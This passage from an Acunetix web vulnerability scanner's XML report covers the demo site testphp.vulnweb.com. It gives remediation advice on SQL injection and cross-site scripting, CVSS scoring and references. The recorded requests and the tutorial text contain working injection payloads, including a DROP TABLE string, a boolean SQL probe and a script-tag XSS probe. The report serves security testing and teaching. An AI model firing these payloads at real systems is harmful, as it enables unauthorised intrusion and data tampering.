    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /artists.php?artist=3%20AND%203*2*1=6%20AND%20470=470 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:52:34 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5400
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="52" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">name</font></b> was set to <b><font color="dark">&lt;your%20name%20here&gt;'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;h4vV(9282)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/comment.php]]></Affects>
       <Parameter><![CDATA[name]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /comment.php HTTP/1.1
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

Submit=Submit&amp;comment=1&amp;name=&lt;your%2520name%2520here&gt;'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;h4vV(9282)&lt;/ScRiPt&gt;&amp;phpaction=echo%20%24_POST[comment];]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:52:44 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 651
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="53" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (Error_Message.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uuname</font></b> was set to <b><font color="dark">12345'&quot;\'\&quot;);|]*%00{%0d%0a&lt;%00&gt;%bf%27'#??#</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">You have an error in your SQL syntax</font></pre>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uuname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 225
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=dbginalr&amp;uuname=12345'&quot;\'\&quot;);|]*%00{%0d%0a&lt;%00&gt;%bf%27'####]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:06 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 577
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="54" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
